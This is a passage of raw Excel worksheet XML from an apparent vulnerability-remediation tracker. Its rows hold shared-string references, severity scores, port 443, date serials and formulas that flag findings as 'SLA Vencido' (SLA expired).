        <v>43</v>
      </c>
      <c r="Q4" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R4" s="4">
        <v>443</v>
      </c>
      <c r="S4" s="22"/>
      <c r="T4" s="8">
        <v>42746</v>
      </c>
      <c r="U4" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>3463</v>
      </c>
      <c r="V4" s="8">
        <f t="shared" si="1"/>
        <v>42836</v>
      </c>
      <c r="W4" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X4" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y4" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z4" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA4" s="8">
        <v>44025</v>
      </c>
      <c r="AB4" s="4"/>
      <c r="AC4" s="4"/>
      <c r="AD4" s="36" t="s">
        <v>64</v>
      </c>
      <c r="AE4" s="27">
        <v>44012</v>
      </c>
      <c r="AF4" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG4" s="27"/>
      <c r="AH4" t="str">
        <f>IFERROR(VLOOKUP(H4,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="5" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A5" s="5">
        <v>4</v>
      </c>
      <c r="B5" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C5" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D5" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E5" s="4" t="s">
        <v>65</v>
      </c>
      <c r="F5" s="4"/>
      <c r="G5" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H5" s="4" t="s">
        <v>66</v>
      </c>
      <c r="I5" s="4" t="s">
        <v>67</v>
      </c>
      <c r="J5" s="4" t="s">
        <v>68</v>
      </c>
      <c r="K5" s="4"/>
      <c r="L5" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M5" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N5" s="7">
        <v>5.5999999046325684</v>
      </c>
      <c r="O5" s="6"/>
      <c r="P5" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q5" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R5" s="4">
        <v>443</v>
      </c>
      <c r="S5" s="22"/>
      <c r="T5" s="8">
        <v>43719</v>
      </c>
      <c r="U5" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2490</v>
      </c>
      <c r="V5" s="8">
        <f t="shared" si="1"/>
        <v>43809</v>
      </c>
      <c r="W5" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X5" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y5" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z5" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA5" s="8">
        <v>44025</v>
      </c>
      <c r="AB5" s="9" t="s">
        <v>69</v>
      </c>
      <c r="AC5" s="9" t="s">
        <v>70</v>
      </c>
      <c r="AD5" s="32" t="s">
        <v>71</v>
      </c>
      <c r="AE5" s="27">
        <v>44012</v>
      </c>
      <c r="AF5" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG5" s="27"/>
      <c r="AH5" t="str">
        <f>IFERROR(VLOOKUP(H5,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="6" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A6" s="5">
        <v>5</v>
      </c>
      <c r="B6" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C6" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D6" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E6" s="4" t="s">
        <v>72</v>
      </c>
      <c r="F6" s="4"/>
      <c r="G6" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H6" s="4" t="s">
        <v>73</v>
      </c>
      <c r="I6" s="4" t="s">
        <v>74</v>
      </c>
      <c r="J6" s="4" t="s">
        <v>75</v>
      </c>
      <c r="K6" s="4"/>
      <c r="L6" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M6" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N6" s="7">
        <v>5.3000001907348633</v>
      </c>
      <c r="O6" s="6"/>
      <c r="P6" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q6" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R6" s="4">
        <v>443</v>
      </c>
      <c r="S6" s="22"/>
      <c r="T6" s="8">
        <v>42879</v>
      </c>
      <c r="U6" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>3330</v>
      </c>
      <c r="V6" s="8">
        <f t="shared" si="1"/>
        <v>42969</v>
      </c>
      <c r="W6" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X6" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y6" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z6" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA6" s="8">
        <v>44025</v>
      </c>
      <c r="AB6" s="4"/>
      <c r="AC6" s="4"/>
      <c r="AD6" s="32" t="s">
        <v>76</v>
      </c>
      <c r="AE6" s="27">
        <v>44012</v>
      </c>
      <c r="AF6" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG6" s="27"/>
      <c r="AH6" t="str">
        <f>IFERROR(VLOOKUP(H6,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="7" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A7" s="5">
        <v>6</v>
      </c>
      <c r="B7" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C7" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D7" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E7" s="4" t="s">
        <v>77</v>
      </c>
      <c r="F7" s="4"/>
      <c r="G7" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H7" s="4" t="s">
        <v>78</v>
      </c>
      <c r="I7" s="4" t="s">
        <v>79</v>
      </c>
      <c r="J7" s="4" t="s">
        <v>80</v>
      </c>
      <c r="K7" s="4"/>
      <c r="L7" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M7" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N7" s="7">
        <v>5.3000001907348633</v>
      </c>
      <c r="O7" s="6"/>
      <c r="P7" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q7" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R7" s="4">
        <v>443</v>
      </c>
      <c r="S7" s="22"/>
      <c r="T7" s="8">
        <v>43207</v>
      </c>
      <c r="U7" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>3002</v>
      </c>
      <c r="V7" s="8">
        <f t="shared" si="1"/>
        <v>43297</v>
      </c>
      <c r="W7" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X7" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y7" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z7" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA7" s="8">
        <v>44025</v>
      </c>
      <c r="AB7" s="9" t="s">
        <v>81</v>
      </c>
      <c r="AC7" s="9" t="s">
        <v>82</v>
      </c>
      <c r="AD7" s="32" t="s">
        <v>83</v>
      </c>
      <c r="AE7" s="27">
        <v>44012</v>
      </c>
      <c r="AF7" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG7" s="27"/>
      <c r="AH7" t="str">
        <f>IFERROR(VLOOKUP(H7,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="8" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A8" s="5">
        <v>7</v>
      </c>
      <c r="B8" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C8" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D8" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E8" s="4" t="s">
        <v>84</v>
      </c>
      <c r="F8" s="4"/>
      <c r="G8" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H8" s="4" t="s">
        <v>85</v>
      </c>
      <c r="I8" s="4" t="s">
        <v>86</v>
      </c>
      <c r="J8" s="4" t="s">
        <v>87</v>
      </c>
      <c r="K8" s="4"/>
      <c r="L8" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M8" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N8" s="7">
        <v>5.3000001907348633</v>
      </c>
      <c r="O8" s="6"/>
      <c r="P8" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q8" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R8" s="4">
        <v>443</v>
      </c>
      <c r="S8" s="22"/>
      <c r="T8" s="8">
        <v>42608</v>
      </c>
      <c r="U8" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>3601</v>
      </c>
      <c r="V8" s="8">
        <f t="shared" si="1"/>
        <v>42698</v>
      </c>
      <c r="W8" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X8" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y8" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z8" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA8" s="8">
        <v>44025</v>
      </c>
      <c r="AB8" s="4"/>
      <c r="AC8" s="4"/>
      <c r="AD8" s="32" t="s">
        <v>88</v>
      </c>
      <c r="AE8" s="27">
        <v>44012</v>
      </c>
      <c r="AF8" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG8" s="27"/>
      <c r="AH8" t="str">
        <f>IFERROR(VLOOKUP(H8,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="9" spans="1:34" ht="232" hidden="1" x14ac:dyDescent="0.35">
      <c r="A9" s="5">
        <v>8</v>
      </c>
      <c r="B9" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C9" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D9" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E9" s="5" t="s">
        <v>34</v>
      </c>
      <c r="F9" s="4"/>
      <c r="G9" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H9" s="4" t="s">
        <v>89</v>
      </c>
      <c r="I9" s="4" t="s">
        <v>90</v>
      </c>
      <c r="J9" s="4" t="s">
        <v>91</v>
      </c>
      <c r="K9" s="4"/>
      <c r="L9" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M9" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N9" s="7">
        <v>5.3000001907348633</v>
      </c>
      <c r="O9" s="6"/>
      <c r="P9" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q9" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R9" s="4">
        <v>443</v>
      </c>
      <c r="S9" s="22"/>
      <c r="T9" s="8">
        <v>43580</v>
      </c>
      <c r="U9" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2629</v>
      </c>
      <c r="V9" s="8">
        <f t="shared" si="1"/>
        <v>43670</v>
      </c>
      <c r="W9" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X9" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y9" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z9" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA9" s="8">
        <v>44025</v>
      </c>
      <c r="AB9" s="9" t="s">
        <v>92</v>
      </c>
      <c r="AC9" s="4" t="s">
        <v>70</v>
      </c>
      <c r="AD9" s="32" t="s">
        <v>71</v>
      </c>
      <c r="AE9" s="27">
        <v>44012</v>
      </c>
      <c r="AF9" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG9" s="27"/>
      <c r="AH9" t="str">
        <f>IFERROR(VLOOKUP(H9,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="10" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A10" s="5">
        <v>9</v>
      </c>
      <c r="B10" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C10" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D10" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E10" s="4" t="s">
        <v>93</v>
      </c>
      <c r="F10" s="4"/>
      <c r="G10" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H10" s="9" t="s">
        <v>94</v>
      </c>
      <c r="I10" s="4" t="s">
        <v>95</v>
      </c>
      <c r="J10" s="4" t="s">
        <v>96</v>
      </c>
      <c r="K10" s="4"/>
      <c r="L10" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M10" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N10" s="7">
        <v>4.3000001907348633</v>
      </c>
      <c r="O10" s="6"/>
      <c r="P10" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q10" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R10" s="4"/>
      <c r="S10" s="22"/>
      <c r="T10" s="8">
        <v>43609</v>
      </c>
      <c r="U10" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2600</v>
      </c>
      <c r="V10" s="8">
        <f t="shared" si="1"/>
        <v>43699</v>
      </c>
      <c r="W10" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X10" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y10" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z10" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA10" s="8">
        <v>44025</v>
      </c>
      <c r="AB10" s="4" t="s">
        <v>97</v>
      </c>
      <c r="AC10" s="9" t="s">
        <v>98</v>
      </c>
      <c r="AD10" s="32" t="s">
        <v>99</v>
      </c>
      <c r="AE10" s="27">
        <v>44012</v>
      </c>
      <c r="AF10" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG10" s="27"/>
      <c r="AH10" t="str">
        <f>IFERROR(VLOOKUP(H10,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="11" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A11" s="5">
        <v>10</v>
      </c>
      <c r="B11" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C11" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D11" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E11" s="4" t="s">
        <v>100</v>
      </c>
      <c r="F11" s="4"/>
      <c r="G11" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H11" s="4" t="s">
        <v>101</v>
      </c>
      <c r="I11" s="4" t="s">
        <v>102</v>
      </c>
      <c r="J11" s="4" t="s">
        <v>103</v>
      </c>
      <c r="K11" s="4"/>
      <c r="L11" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M11" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N11" s="7">
        <v>4</v>
      </c>
      <c r="O11" s="6"/>
      <c r="P11" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q11" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R11" s="4"/>
      <c r="S11" s="22"/>
      <c r="T11" s="8">
        <v>43609</v>
      </c>
      <c r="U11" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2600</v>
      </c>
      <c r="V11" s="8">
        <f t="shared" si="1"/>
        <v>43699</v>
      </c>
      <c r="W11" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X11" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y11" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z11" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA11" s="8">
        <v>44025</v>
      </c>
      <c r="AB11" s="4" t="s">
        <v>104</v>
      </c>
      <c r="AC11" s="9" t="s">
        <v>105</v>
      </c>
      <c r="AD11" s="32" t="s">
        <v>106</v>
      </c>
      <c r="AE11" s="27">
        <v>44012</v>
      </c>
      <c r="AF11" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG11" s="27"/>
      <c r="AH11" t="str">
        <f>IFERROR(VLOOKUP(H11,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="12" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A12" s="5">
        <v>11</v>
      </c>
      <c r="B12" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C12" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D12" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E12" s="4" t="s">
        <v>107</v>
      </c>
      <c r="F12" s="4"/>
      <c r="G12" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H12" s="9" t="s">
        <v>108</v>
      </c>
      <c r="I12" s="4" t="s">
        <v>109</v>
      </c>
      <c r="J12" s="4" t="s">
        <v>110</v>
      </c>
      <c r="K12" s="4"/>
      <c r="L12" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M12" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N12" s="7">
        <v>3.7000000476837158</v>
      </c>
      <c r="O12" s="6" t="s">
        <v>112</v>
      </c>
      <c r="P12" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q12" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R12" s="4">
        <v>443</v>
      </c>
      <c r="S12" s="22"/>
      <c r="T12" s="8">
        <v>43207</v>
      </c>
      <c r="U12" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>3002</v>
      </c>
      <c r="V12" s="8">
        <f t="shared" si="1"/>
        <v>43327</v>
      </c>
      <c r="W12" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X12" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y12" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z12" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA12" s="8">
        <v>44025</v>
      </c>
      <c r="AB12" s="9" t="s">
        <v>113</v>
      </c>
      <c r="AC12" s="9" t="s">
        <v>114</v>
      </c>
      <c r="AD12" s="32" t="s">
        <v>115</v>
      </c>
      <c r="AE12" s="27">
        <v>44012</v>
      </c>
      <c r="AF12" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG12" s="27"/>
      <c r="AH12" t="str">
        <f>IFERROR(VLOOKUP(H12,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="13" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A13" s="5">
        <v>12</v>
      </c>
      <c r="B13" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C13" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D13" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E13" s="4" t="s">
        <v>116</v>
      </c>
      <c r="F13" s="4"/>
      <c r="G13" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H13" s="4" t="s">
        <v>117</v>
      </c>
      <c r="I13" s="4" t="s">
        <v>118</v>
      </c>
      <c r="J13" s="4" t="s">
        <v>119</v>
      </c>
      <c r="K13" s="4"/>
      <c r="L13" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M13" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N13" s="7">
        <v>3.5</v>
      </c>
      <c r="O13" s="6"/>
      <c r="P13" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q13" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R13" s="4"/>
      <c r="S13" s="22"/>
      <c r="T13" s="8">
        <v>43784</v>
      </c>
      <c r="U13" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2425</v>
      </c>
      <c r="V13" s="8">
        <f t="shared" si="1"/>
        <v>43904</v>
      </c>
      <c r="W13" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X13" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y13" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z13" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA13" s="8">
        <v>44025</v>
      </c>
      <c r="AB13" s="9" t="s">
        <v>120</v>
      </c>
      <c r="AC13" s="9" t="s">
        <v>121</v>
      </c>
      <c r="AD13" s="32" t="s">
        <v>122</v>
      </c>
      <c r="AE13" s="27">
        <v>44012</v>
      </c>
      <c r="AF13" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG13" s="27"/>
      <c r="AH13" t="str">
        <f>IFERROR(VLOOKUP(H13,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="14" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A14" s="5">
        <v>13</v>
      </c>
      <c r="B14" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C14" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D14" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E14" s="4" t="s">
        <v>123</v>
      </c>
      <c r="F14" s="4"/>
      <c r="G14" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H14" s="4" t="s">
        <v>124</v>
      </c>
      <c r="I14" s="4" t="s">
        <v>125</v>
      </c>
      <c r="J14" s="4" t="s">
        <v>126</v>
      </c>
      <c r="K14" s="4"/>
      <c r="L14" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M14" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N14" s="7">
        <v>3.2000000476837158</v>
      </c>
      <c r="O14" s="6"/>
      <c r="P14" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q14" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R14" s="4"/>
      <c r="S14" s="22"/>
      <c r="T14" s="8">
        <v>43609</v>
      </c>
      <c r="U14" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2600</v>
      </c>
      <c r="V14" s="8">
        <f t="shared" si="1"/>
        <v>43729</v>
      </c>
      <c r="W14" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X14" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y14" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z14" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA14" s="8">
        <v>44025</v>
      </c>
      <c r="AB14" s="9" t="s">
        <v>127</v>
      </c>
      <c r="AC14" s="9" t="s">
        <v>128</v>
      </c>
      <c r="AD14" s="32" t="s">
        <v>129</v>
      </c>
      <c r="AE14" s="27">
        <v>44012</v>
      </c>
      <c r="AF14" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG14" s="27"/>
      <c r="AH14" t="str">
        <f>IFERROR(VLOOKUP(H14,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="15" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A15" s="5">
        <v>14</v>
      </c>
      <c r="B15" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C15" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D15" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E15" s="4" t="s">
        <v>130</v>
      </c>
      <c r="F15" s="4"/>
      <c r="G15" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H15" s="4" t="s">
        <v>131</v>
      </c>
      <c r="I15" s="4" t="s">
        <v>132</v>
      </c>
      <c r="J15" s="4" t="s">
        <v>133</v>
      </c>
      <c r="K15" s="4"/>
      <c r="L15" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M15" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N15" s="7">
        <v>2.5999999046325684</v>
      </c>
      <c r="O15" s="6"/>
      <c r="P15" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q15" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R15" s="4"/>
      <c r="S15" s="22"/>
      <c r="T15" s="8">
        <v>43609</v>
      </c>
      <c r="U15" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2600</v>
      </c>
      <c r="V15" s="8">
        <f t="shared" si="1"/>
        <v>43729</v>
      </c>
      <c r="W15" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X15" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y15" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z15" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA15" s="8">
        <v>44025</v>
      </c>
      <c r="AB15" s="9" t="s">
        <v>134</v>
      </c>
      <c r="AC15" s="9" t="s">
        <v>135</v>
      </c>
      <c r="AD15" s="32" t="s">
        <v>136</v>
      </c>
      <c r="AE15" s="27">
        <v>44012</v>
      </c>
      <c r="AF15" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG15" s="27"/>
      <c r="AH15" t="str">
        <f>IFERROR(VLOOKUP(H15,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="16" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A16" s="5">
        <v>15</v>
      </c>
      <c r="B16" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C16" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D16" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E16" s="4" t="s">
        <v>137</v>
      </c>
      <c r="F16" s="4"/>
      <c r="G16" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H16" s="6" t="s">
        <v>139</v>
      </c>
      <c r="I16" s="4" t="s">
        <v>140</v>
      </c>
      <c r="J16" s="4" t="s">
        <v>68</v>
      </c>
      <c r="K16" s="4"/>
      <c r="L16" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M16" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N16" s="7">
        <v>5.5999999046325684</v>
      </c>
      <c r="O16" s="6"/>
      <c r="P16" s="4" t="s">
        <v>142</v>
      </c>
      <c r="Q16" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R16" s="4">
        <v>443</v>
      </c>
      <c r="S16" s="22"/>
      <c r="T16" s="8">
        <v>43719</v>
      </c>
      <c r="U16" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2490</v>
      </c>
      <c r="V16" s="8">
        <f t="shared" si="1"/>
        <v>43809</v>
      </c>
      <c r="W16" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X16" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y16" s="12" t="s">
        <v>144</v>
      </c>
      <c r="Z16" s="12" t="s">
        <v>145</v>
      </c>
      <c r="AA16" s="8">
        <v>44089</v>
      </c>
      <c r="AB16" s="9" t="s">
        <v>146</v>
      </c>
      <c r="AC16" s="9" t="s">
        <v>70</v>
      </c>
      <c r="AD16" s="32" t="s">
        <v>71</v>
      </c>
      <c r="AE16" s="29" t="s">
        <v>147</v>
      </c>
      <c r="AF16" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG16" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH16" t="str">
        <f>IFERROR(VLOOKUP(H16,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="17" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A17" s="5">
        <v>16</v>
      </c>
      <c r="B17" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C17" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D17" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E17" s="4" t="s">
        <v>150</v>
      </c>
      <c r="F17" s="4"/>
      <c r="G17" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H17" s="6" t="s">
        <v>151</v>
      </c>
      <c r="I17" s="4" t="s">
        <v>152</v>
      </c>
      <c r="J17" s="4" t="s">
        <v>153</v>
      </c>
      <c r="K17" s="4"/>
      <c r="L17" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M17" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N17" s="7">
        <v>4.3000001907348633</v>
      </c>
      <c r="O17" s="6"/>
      <c r="P17" s="4" t="s">
        <v>142</v>
      </c>
      <c r="Q17" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R17" s="4">
        <v>443</v>
      </c>
      <c r="S17" s="22"/>
      <c r="T17" s="8">
        <v>43719</v>
      </c>
      <c r="U17" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2490</v>
      </c>
      <c r="V17" s="8">
        <f t="shared" si="1"/>
        <v>43809</v>
      </c>
      <c r="W17" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X17" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y17" s="12" t="s">
        <v>144</v>
      </c>
      <c r="Z17" s="12" t="s">
        <v>145</v>
      </c>
      <c r="AA17" s="8">
        <v>44181</v>
      </c>
      <c r="AB17" s="4"/>
      <c r="AC17" s="9" t="s">
        <v>154</v>
      </c>
      <c r="AD17" s="32" t="s">
        <v>155</v>
      </c>
      <c r="AE17" s="28"/>
      <c r="AF17" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG17" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH17" t="str">
        <f>IFERROR(VLOOKUP(H17,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="18" spans="1:34" ht="232" hidden="1" x14ac:dyDescent="0.35">
